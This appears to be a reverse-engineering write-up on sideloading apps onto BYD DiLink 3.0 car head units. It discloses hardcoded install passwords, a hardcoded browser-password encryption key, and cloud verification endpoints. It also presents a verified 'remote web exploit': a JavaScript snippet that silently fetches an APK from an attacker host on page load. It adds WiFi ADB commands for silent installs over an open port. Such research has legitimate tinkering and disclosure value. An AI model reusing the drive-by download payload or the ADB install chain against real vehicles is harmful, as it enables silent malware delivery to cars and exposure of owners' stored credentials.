# Sideloading Internals

Deep dive into how BYD DiLink 3.0 handles third-party app installation. Reverse-engineered from `AftermarketInstallTool.apk` (`/system/app/AftermarketInstallTool/`).

## AftermarketInstallTool

System app (Kotlin/Compose) that handles all third-party APK installation from USB drives. Package: `com.byd.aftermarketinstalltool`.

### Verification Paths

Three verification modes, selected by `scanDevice` field in `ScanInfoBean`:

| scanDevice | Constant | Method | Password Required |
|-----------|----------|--------|-------------------|
| 0 | `VERIFY_SCAN_TYPE_PHONE` | Phone scan — `initFreeApks()` | **NO — all APKs approved** |
| 1 | `VERIFY_SCAN_TYPE_VDS` | Online cloud verification | No (cloud decides) |
| 2 | `VERIFY_SCAN_TYPE_PW` | Local password (SHA1) | Yes |

### Country-Based Configuration

The folder name is `"Third Party Apps " + countryCode`. Country code comes from `sys.byd.countrycode` system property.

| Country | Code | Folder Name | Password | APK Whitelist |
|---------|------|-------------|----------|---------------|
| Brazil | 55 | `Third Party Apps 55` | `BYD6125F` | All allowed |
| Mexico | 52 | `Third Party Apps 52` | `BYD6125F` | All allowed |
| Indonesia | 62 | `Third Party Apps 62` | `BYD6125F` | All allowed |
| Thailand | 66 | `Third Party Apps 66` | `BYD6125F` | All allowed |
| Saudi Arabia | 966 | `Third Party Apps 966` | `BYD6125F` | All allowed |
| UAE | 971 | `Third Party Apps 971` | `BYD6125F` | All allowed |
| Uzbekistan | 998 | `Third Party Apps 998` | `BYD6125F` | All allowed |
| Kazakhstan | 997 | `Third Party Apps 997` | `BYD6125F` | **Restricted** — only Yandex, Telegram, WhatsApp, Zoom, etc. |
| India | 91 | `Third Party Apps 91` | `130820` | **Restricted** — only `com.mappls.auto.bydznav23` |
| Europe, AU, JP, etc. | varies | `Application Installation {code}` | None (online) | Cloud-verified |

Password is stored as SHA1 hash for comparison: `SHA1("BYD6125F")`.

### Strategy Configuration

The `StrategyManager` service provides an `ApkInstallConfig` strategy value that overrides default behavior:

| Config | Meaning |
|--------|---------|
| `0` (default) | Use country-based rules above |
| `1` | QR code disabled — local mode with APK whitelist set to `{"disable"}` (blocks all installs) |
| `2` | QR code enabled — allows QR-based verification |

Format: `{config}_{password}` (e.g., `0_BYD6125F`). Parsed by splitting on `_`.

### Online Verification API

For countries without local passwords (Europe, Australia, Japan, etc.), APKs are verified against BYD's cloud.

**Regional data centers:**

| Region | Endpoint |
|--------|----------|
| Europe | `apr-eu.byd.auto` |
| Brazil | `apr-br.byd.auto` |
| Singapore/APAC | `apr-sg.byd.auto` |
| Australia | `apr-au.byd.auto` |
| Japan | `apr-jp.byd.auto` |
| Mexico/LATAM | `apr-mx.byd.auto` |
| Middle East/Africa | `apr-no.byd.auto` |
| Uzbekistan | `apr-uz.byd.auto` |

**Verification endpoint:**

```
POST https://{datacenter}/authentication/whitelist-verify
Content-Type: application/json

{
  "countryCode": "55",
  "source": 1,
  "vid": "vehicle_identifier",
  "taskId": "unique_task_id",
  "verifyTime": 1716163200000,
  "packageList": [
    {
      "packageName": "com.example.app",
      "appVersion": "1.0.0",
      "deviceType": "IVI"
    }
  ]
}
```

**Response:**

```json
{
  "code": 0,
  "message": "success",
  "data": [
    {
      "packageName": "com.example.app",
      "deviceType": "IVI",
      "appVersion": "1.0.0",
      "verifyResult": true,
      "verifyMessage": "approved"
    }
  ]
}
```

Error codes: 0=success, 1=parameter null, 2=parameter error, 3=authority exception (rate limited), 4=QR not scanned, 5=business exception.

**Device types:** IVI (main head unit), FSE, LEFT_RSE, RIGHT_RSE, RCS, RIES, REAR_OVERHEAD, TV.

### Kazakhstan APK Whitelist

Only these packages can be installed on Kazakhstan units:

- `ru.dublgis.dgismobile` (2GIS Maps)
- `ru.yandex.yandexnavi` (Yandex Navigator)
- `ru.yandex.music` (Yandex Music)
- `com.streema.simpleradio` (Simple Radio)
- `com.uma.musicvk` (VK Music)
- `ru.yandex.weatherplugin` (Yandex Weather)
- `com.originalapp.uzbekistanweather`
- `com.apalon.weatherlive.free`
- `com.bugunuz.mobile`
- `uz.muloqot.daryo`
- `org.telegram.messenger` (Telegram)
- `com.whatsapp` (WhatsApp)
- `us.zoom.videomeetings` (Zoom)
- `com.gpack.agent`

### USB Detection Flow

`UsbBroadcastReceiver` listens for USB mount events. When a USB drive is inserted:

1. Scans for folder matching `"Third Party Apps " + countryCode` (local) or `"Application Installation " + countryCode` (online)
2. Reads APK files from the folder
3. Depending on country configuration:
   - **Local (password):** Shows password dialog → SHA1 comparison → installs approved APKs
   - **Online (QR/cloud):** Sends APK list to BYD cloud → installs approved APKs
   - **Phone scan:** Approves all APKs immediately

## Browser Download Block

BYD's Chromium browser (`com.byd.browser`) has download functionality completely disabled at the Java level.

**Source:** `org.chromium.chrome.browser.download.DownloadController`

```java
@CalledByNative
public static void onDownloadStarted() {
    // BYD replaced actual download logic with a toast
    Toast.makeText(context, R$string.forbid_downloading, Toast.LENGTH_LONG).show();
}

@CalledByNative
public static void onDownloadUpdated(DownloadInfo downloadInfo) {
    Toast.makeText(context, "禁止->updated", Toast.LENGTH_LONG).show();
}
```

- ALL downloads blocked — not just APKs
- Block is in Java code, called from native Chromium C++ via `@CalledByNative`
- Cannot be bypassed via settings or permissions
- Toast message: "Download proibido: O download pode representar uma ameaça à segurança e estabilidade do sistema do veículo"
- Resource: `R$string.forbid_downloading` (ID: `0x7f1404e1`)

## Other Install Vectors

### File Manager (ACE Ex File Manager)

`com.ace.ex.file.manager` is **not pre-installed** — must be sideloaded first via ADB or the `Third Party Apps` USB method. Once installed, it has `REQUEST_INSTALL_PACKAGES` permission, can browse USB drives, and install APKs directly — bypassing the `Third Party Apps` folder requirement and password for subsequent installs.

### Package Installer Intent

Direct install from `/sdcard/` works:

```bash
adb shell am start -a android.intent.action.VIEW \
  -t "application/vnd.android.package-archive" \
  -d "file:///sdcard/Download/app.apk"
```

### Bluetooth OPP

`BluetoothOppLauncherActivity` is registered with multiple intent filters. The car can receive files via Bluetooth Object Push Profile. Untested for APK transfer.

### System Settings

- `install_non_market_apps = 1` (unknown sources enabled)
- No device policy restrictions on app installation
- Per-app install permission: browser and file manager both have `REQUEST_INSTALL_PACKAGES`

## Browser Exploit: Download Bypass

**Status:** Confirmed working — blob download is a remote web exploit (no ADB needed). Web Share is a secondary method (requires HTTPS + file manager).

BYD's download block is only at `DownloadController.onDownloadStarted()` — a single Java entry point called from native Chromium. The `fetch()` API operates entirely in the renderer process and never touches the download manager.

### Browser: Chromium 113

```
versionName=113.1.6.37
targetSdk=33
```

Channel 4 (stable). Modern enough that memory-corruption exploits are not viable.

### API Availability (HTTP vs HTTPS)

| API | HTTP | HTTPS (self-signed) |
|-----|------|---------------------|
| `isSecureContext` | false | **true** |
| `fetch()` | yes | yes |
| `Blob` / `createObjectURL` | yes | yes |
| `navigator.share()` | no | **yes** |
| `navigator.canShare({files})` | no | **yes (returns true for APK)** |
| `ServiceWorker` | no | **yes** |
| `caches` (Cache API) | no | **yes** |
| `showSaveFilePicker` | no | no |
| `clipboard` | no | **yes** |

### Exploit Chain

1. Host page over **HTTPS** (self-signed cert OK — user accepts warning)
2. User taps "Install" button (real user gesture required)
3. JavaScript `fetch('app.apk')` downloads APK into memory — **download manager never involved**
4. `navigator.share({files: [new File([blob], 'app.txt', {type: 'text/plain'})]})` — disguise as text file
5. Share sheet opens → user picks file manager → saves to `/sdcard/Download/`
6. Rename `app.txt` → `app.apk`
7. Open with package installer → Install

### MIME Type Restriction

`navigator.share()` with files works for `text/plain` but **blocks binary MIME types** (`application/vnd.android.package-archive`, `application/octet-stream`, `application/zip`). The APK binary must be disguised as text.

`navigator.canShare()` returns `true` for all types but the actual share call gets `NotAllowedError: Permission denied` for non-text types.

### Stock Unit Limitation

On a stock BYD (no third-party apps), the only share target for files is **Bluetooth OPP** — which sends files to another device, not save locally. The native `com.byd.filemanager` does not register for `ACTION_SEND` intents.

**Practical strategy:**
- First install: USB `Third Party Apps 55` + password `BYD6125F`
- After file manager installed: browser exploit becomes viable for future installs
- App self-updates: built-in HTTP download + PackageInstaller API (no browser needed)

### Blob Download Bypass — REMOTE WEB EXPLOIT

`fetch()` → blob → `<a download>` bypasses BYD's download block entirely. **No ADB, no CDP, no user interaction beyond page visit required.** Any web page can silently write files to `/sdcard/Download/`.

**Minimal exploit (runs on any page, no CDP):**

```javascript
(async () => {
    const resp = await fetch('https://attacker.com/payload.apk');
    const blob = await resp.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'payload.apk';
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
})()
```

Can fire on `window.onload` — no button click needed. Works from HTTP and HTTPS origins. Fetch must be same-origin (attacker hosts both page and payload) or target must have permissive CORS headers.

**Why it works:** Direct URL downloads (`<a href="remote-url" download>`, `Page.navigate`) trigger `DownloadController.onDownloadStarted()` which cancels immediately (`state=canceled`, `receivedBytes=0`). Blob URL downloads take a different native code path: `fetch()` retrieves all bytes in the renderer process (Network domain), `URL.createObjectURL` creates a local blob reference, and the blob-to-disk write bypasses the Java cancel layer entirely. BYD's download block only hooks the URL-based download initiation path, not the blob-to-disk path.

**Evidence from CDP events (when observed):**
- Direct download: `Page.downloadWillBegin` → `downloadProgress state=canceled receivedBytes=0` (instant kill)
- Blob download: `Network.loadingFinished` (all bytes) → `Page.downloadWillBegin` → `downloadProgress receivedBytes=N state=inProgress` → `state=completed` → file persists

**`Browser.setDownloadBehavior` has NO effect:** Tested with `behavior=deny` explicitly set — blob download still succeeds. Tested with `behavior=default` — still succeeds. The CDP download behavior control and BYD's Java cancel layer both fail to intercept blob downloads.

**Verification matrix:**

| Test | CDP attached? | setDownloadBehavior | Result |
|------|--------------|---------------------|--------|
| CDP + setDownloadBehavior=allow + blob | Yes | allow | File written (10,240 bytes) |
| CDP + setDownloadBehavior=deny + blob | Yes | deny | File written (10,240 bytes) |
| CDP Runtime.evaluate only (no setDownloadBehavior) | Yes | none | File written (10,240 bytes) |
| Page autofire on window.load (zero CDP) | No | none | File written (10,240 bytes) |

**Verified file sizes:**
- 10KB binary: `test-download.bin` (10,240 bytes, persisted)
- 5MB binary: `big-dl-blob.bin` (5,242,880 bytes, persisted, correct content)
- 52MB APK: `sideloaded.apk` (52,331,569 bytes, MD5 verified identical to source)

Files written to `/sdcard/Download/` persist permanently — not cleaned up.

**Methods that still fail (for reference):**
1. `<a download>` with direct remote URL — canceled (receivedBytes=0)
2. `Page.navigate` to file URL — canceled
3. `data:` URI anchor download — canceled
4. `Fetch.enable` + intercept — no download bypass

### CDP Access

Chrome DevTools Protocol is accessible via `localabstract:chrome_devtools_remote`. Chromium 113, Protocol 1.3. Connection: `ws://localhost:9222/devtools/browser` (requires ADB port forward + `suppress_origin=True`). Useful for inspecting download events and injecting JS, but NOT required for the blob download bypass.

### OPFS (Origin Private File System)

`navigator.storage.getDirectory()` works — confirmed writing binary data to sandboxed browser storage. But OPFS is sandboxed to the browser's internal data directory — files are NOT accessible from the filesystem, file managers, or other apps. No escape path to user-visible storage.

### PWA Install (BeforeInstallPromptEvent)

`typeof BeforeInstallPromptEvent === 'function'` — the API exists and the event fires.

**Requirements for SW registration:** Self-signed HTTPS certs are rejected for Service Worker fetch. Must use `localhost` (treated as secure context). ADB reverse proxy (`adb reverse tcp:8191 tcp:8191`) makes host server appear as localhost to car browser.

**Install flow:**
1. Navigate to `http://localhost:8191/pwa.html` (via ADB reverse proxy)
2. Service Worker registers successfully on localhost
3. `beforeinstallprompt` event fires, `platforms: "web"`
4. `prompt()` requires real user gesture (CDP `Runtime.evaluate` doesn't count — must use ADB tap or real touch)
5. BYD shows custom "Create shortcut" dialog (NOT Chrome's native PWA install dialog)
6. User taps "Create" → `userChoice.outcome: "accepted"` → `appinstalled` event fires

**Result:** Creates a Chrome shortcut, **NOT a WebAPK**. Package count unchanged (182 → 182). No `app_WebAPKs/` or `app_webapps/` directory created.

Shortcut intent details from `dumpsys shortcut`:
```
Intent { act=com.google.android.apps.chrome.webapps.WebappManager.ACTION_START_WEBAPP }
  webapp_source=7 (ADD_TO_HOMESCREEN_STANDALONE)
  webapp_display_mode=3 (standalone)
  webapp_scope=http://localhost:8191/
  webapp_short_name=BYDTool
  webapp_shortcut_version=3
```

BYD did not modify Chrome's source tag — `webapp_source=7` is standard Chromium `ADD_TO_HOMESCREEN_STANDALONE`. They only replaced the install dialog UI with their "Create shortcut" dialog. No WebAPK minting via GMS is attempted despite `com.google.android.gms` being installed.

### External Navigation (intent:// URLs)

`ExternalNavigationHandler` (decompiled: `kw1.java`) has **standard Chromium sanitization with NO BYD modifications**. The `intent://` URL scheme is parsed correctly but Chrome requires target activities to have the `BROWSABLE` category.

Target apps that lack `BROWSABLE`:
- `com.android.packageinstaller` — no `BROWSABLE` activities
- `com.android.settings` — no `BROWSABLE` activities
- `com.byd.filemanager` — no file-handling intent filters at all
- `com.byd.overseaappstore` — system app with install permission but no `BROWSABLE`

This is standard Chromium security, not a BYD patch. Apps like WhatsApp that register `BROWSABLE` activities work fine.

### Browser-Only Sideload: Verdict

**fetch→blob→anchor download bypass is a remote web exploit.** Any web page can silently drop files to `/sdcard/Download/` without ADB, CDP, or user interaction beyond visiting the page.

**Full sideload chain — VERIFIED END TO END:**

Three viable flows, each tested and confirmed:

**Flow A — WiFi ADB (fully automated, zero UI):**
1. `adb connect 192.168.10.10:5555` (port open on all DiLink 3.0 units)
2. `adb install app.apk` — silent install, no user interaction

**Flow B — Browser + ADB hybrid (automated, one-time setup):**
1. User visits attacker page → JS blob download drops APK to `/sdcard/Download/`
2. ADB: `cp /sdcard/Download/app.apk /data/local/tmp/ && pm install /data/local/tmp/app.apk`
3. Fully silent install. `pm install` from `/sdcard/Download/` fails (SELinux: `system_server` can't read `sdcardfs` context). Must copy to `/data/local/tmp/` first.

**Flow C — Browser only (requires non-stock file manager):**
1. User visits attacker page → JS blob download silently drops APK to `/sdcard/Download/` (no tap needed)
2. User opens file manager → Downloads → taps APK → resolver shows 3 options:
   - `com.android.packageinstaller/.InstallStart`
   - `com.gpack.agent/...AppInstallerActivity` (GPack)
   - `com.android.vending/...AppInstallActivity` (microG)
3. User selects installer → install dialog → tap Install

**Note:** Stock BYD has no user-accessible file manager. `com.byd.filemanager` exists but has no launcher activity. EX File Manager (or similar) must be installed first via USB or ADB — making this flow not truly "stock browser only."

**Install step verification results:**

| Install trigger | Result | Details |
|----------------|--------|---------|
| `am start -a VIEW -t application/vnd.android.package-archive -d file:///sdcard/Download/app.apk` | **Works** | Resolver shows 3 installers (+ EX File Manager if installed) |
| `pm install /data/local/tmp/app.apk` | **Works** | Silent install, no UI |
| `pm install /sdcard/Download/app.apk` | Fails | SELinux denies system_server read on sdcardfs |
| `navigator.share({files: [apkFile]})` | Blocked | `NotAllowedError: Permission denied` — even on localhost (secure context). BYD disabled Web Share Level 2 file sharing. `canShare()` returns true but `share()` throws. |
| `chrome://downloads` | Blocked | `ERR_BYD_NETWORK_BLOCK_LIST` — BYD blocks ALL chrome:// URLs |
| `intent://` → PackageInstaller | Fails | No BROWSABLE category |
| `content://downloads/all_downloads` | Fails | `ERR_FILE_NOT_FOUND` |
| `file:///sdcard/Download/app.apk` navigation | Triggers re-download | Browser treats file:// APK as download, not install trigger |
| `window.open('file://...')` | Blocked | Chrome blocks file:// from web origins |
| JS bridge (`window.byd`, `window.android`, etc.) | None found | Only standard `prompt()` exists |

**Secure context findings:**
- `isSecureContext = false` on `https://YOUR_HOST_IP:9191` (self-signed cert)
- `isSecureContext = true` on `http://localhost:8191` (localhost exception)
- Web Share Level 2, Service Worker registration require secure context
- Blob download bypass works regardless of secure context

Summary of all paths:

| Vector | Status | Notes |
|--------|--------|-------|
| fetch→blob→anchor | **WORKS (remote)** | No ADB/CDP needed. Any page can drop files to `/sdcard/Download/` |
| WiFi ADB `pm install` | **WORKS** | Port 5555 open. Silent install from `/data/local/tmp/` |
| `am start` intent | **WORKS** | Resolver shows PackageInstaller, GPack, microG Vending |
| Download manager | Gutted | `DownloadController.onDownloadStarted()` → toast |
| Direct URL `<a download>` | Fails | Java cancel layer kills at receivedBytes=0 |
| `fetch()` → filesystem | No path | `showSaveFilePicker` unavailable, OPFS sandboxed |
| `navigator.share(APK)` | Blocked | `NotAllowedError` even on secure context |
| `intent://` → PackageInstaller | Fails | No `BROWSABLE` category on target apps |
| `chrome://downloads` | Blocked | `ERR_BYD_NETWORK_BLOCK_LIST` — BYD-specific block |
| PWA install | Shortcut only | Creates bookmark, not WebAPK/APK |
| JS-to-native bridge | None | No `@JavascriptInterface`, no custom URL schemes |
| `file://` APK navigation | Re-downloads | Treated as download, not install trigger |
| CVE-2023-3079 | Unverified | V8 type confusion in Chrome 113, but exploitation is complex |

For stock units, USB `Third Party Apps` folder is the official method. The blob download bypass gets files onto the device silently, but the install step still requires either ADB (Flow A/B) or a non-stock file manager (Flow C). No stock-browser-only install path exists yet.

### Other Browser Findings

- `blob:` URLs can be navigated to (URL bar shows blob URL) but don't trigger package installer
- `<a download>` with blob URLs silently blocked (goes through `DownloadController`)
- `chrome://flags` accessible via CDP navigation — IWA Developer Mode flag found
- Browser password encryption: AES/ECB with hardcoded key `"com.byd.browser."` — trivially decryptable
- `BYDCrossFeatureIds` is NOT a JS bridge — decompiler artifact (integer constants reused as bitflags)
- `com.google.android.gms` installed but unused for WebAPK minting
- Screen coordinate mapping: 1920x1080 physical, 1280x548 CSS, DPR 1.5, chrome offset 168px

### Test Harness

The `tools/browser-exploit/` directory contains test tools from this research:
- `index.html` — test page with 10 bypass vectors + autofire mode (`?autofire=1` triggers blob download on page load)
- `install.html` — one-tap install page: blob-downloads APK with unique filename, attempts navigator.share() then falls back to blob download
- `autodownload.html` — auto-fire blob download test (no user gesture required)
- `sideload-test.apk` — minimal signed APK (com.test.sideloadtest, targetSdk 29, 8.5KB) for install chain testing
- `pwa.html` — PWA install test page
- `manifest.json` — PWA manifest
- `sw.js` — service worker for cache API and PWA
- `serve_https.py` — HTTPS server with self-signed cert
- `cdp_download_test.py` — CDP download bypass test (6 methods)
- `cdp_download_test2.py` — focused CDP download test (5 methods + event capture)
- `cdp_capability_audit.py` — full CDP capability audit
- `test-download.bin` — 10KB test binary for download testing

## Tested On

- BYD Dolphin 2025
- DiLink 3.0, Android 10 (API 29)
- Firmware 13.1.32.2507250.1
- Country code: 55 (Brazil)
